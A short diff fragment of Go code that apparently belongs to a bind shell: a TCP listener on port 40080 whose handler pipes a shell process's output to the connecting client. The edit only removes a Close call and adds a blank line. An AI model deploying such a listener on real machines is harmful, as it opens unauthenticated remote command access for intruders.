@@ -14,11 +14,11 @@ func handle(conn net.Conn) {
 	shell.Stdout = wp
 	go io.Copy(conn, rp)
 	shell.Run()
-	shell.Close()
 }
 
 func main() {
 	listener, err := net.Listen("tcp", ":40080")
+    
 	if err != nil {
 		log.Fatalln(err)
 	}
